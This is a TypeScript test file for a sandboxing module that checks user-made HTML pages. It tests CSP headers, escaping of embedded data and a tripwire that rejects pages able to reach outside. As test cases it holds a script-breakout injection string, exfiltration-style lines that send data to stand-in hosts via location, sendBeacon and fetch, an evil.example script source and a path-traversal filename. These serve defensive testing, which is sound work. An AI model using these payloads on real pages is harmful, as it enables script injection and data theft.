import assert from "node:assert/strict";
import { test } from "node:test";

import {
  CHART_LIBRARY,
  PAGE_CSP,
  pageDocument,
  pageFileName,
  pageHeaders,
  pageTripwire,
} from "./page-rules";

test("the page header sandboxes without the same origin and refuses the network", () => {
  const csp = pageHeaders(null)["Content-Security-Policy"];
  assert.equal(csp, PAGE_CSP);
  assert.ok(csp.startsWith("sandbox allow-scripts;"));
  assert.ok(!csp.includes("allow-same-origin"));
  assert.ok(!csp.includes("allow-popups"));
  assert.ok(!csp.includes("allow-top-navigation"));
  assert.ok(csp.includes("connect-src 'none'"));
  assert.ok(csp.includes("default-src 'none'"));
  assert.equal(pageHeaders(null)["Content-Disposition"], undefined);
  assert.match(pageHeaders({ fileName: "a.html" })["Content-Disposition"], /attachment/);
});

test("data goes in after <head>, and no value can close the script", () => {
  const page = pageDocument("<html><head><title>x</title></head><body></body></html>", {
    rows: [{ note: "</script><script>alert(1)</script>" }],
  });
  assert.ok(page.startsWith('<html><head><script type="application/json" id="turing-data">'));
  assert.equal(page.match(/<\/script>/g)?.length, 1);
  assert.ok(page.includes("\\u003c/script>"));
  assert.ok(pageDocument("<p>no head</p>", {}).startsWith("<script"));
});

test("a downloaded page carries the policy first, without the header-only parts", () => {
  const page = pageDocument("<html><head></head></html>", {}, { download: true });
  assert.ok(page.startsWith('<html><head><meta http-equiv="Content-Security-Policy"'));
  assert.ok(page.includes("connect-src 'none'"));
  assert.ok(!page.includes("sandbox"));
  assert.ok(!pageDocument("<html><head></head></html>", {}).includes("http-equiv"));
});

test("a page that could reach outside is refused, and says why", () => {
  const cases: [string, string][] = [
    ["<script>fetch('https://x.example')</script>", "fetch()"],
    ["<script>window.location.href = 'https://x.example?d=' + d</script>", "location"],
    ["<script>location = '//x.example'</script>", "location"],
    ["<script>new Image().src = 'x'; navigator.sendBeacon('/x', d)</script>", "sendBeacon"],
    ['<a href="https://x.example">site</a>', "a link or source outside the page"],
    ['<img src="//x.example/p.png">', "a link or source outside the page"],
    [
      "<style>body{background:url(https://x.example/a.png)}</style>",
      "a stylesheet url() outside the page",
    ],
    [
      '<meta http-equiv="refresh" content="0;url=https://x.example">',
      "a <form>, <iframe>, <object>, <embed>, <base>, <link> or <meta> tag",
    ],
    ['<script src="https://evil.example/chart.js"></script>', "a link or source outside the page"],
    ["<script>open('https://x.example')</script>", "open()"],
  ];
  for (const [html, reason] of cases) assert.equal(pageTripwire(html), reason, html);
});

test("a plain page with the chart library passes", () => {
  const html = `<!doctype html><html><head><script src="${CHART_LIBRARY}"></script></head>
    <body><p>Location: Kannur</p><canvas id="c"></canvas>
    <script>const data = JSON.parse(document.getElementById('turing-data').textContent);</script></body></html>`;
  assert.equal(pageTripwire(html), null);
});

test("a download name is safe", () => {
  assert.equal(pageFileName("Bills by villa — October"), "Bills-by-villa-October.html");
  assert.equal(pageFileName("../../"), "turing-page.html");
});
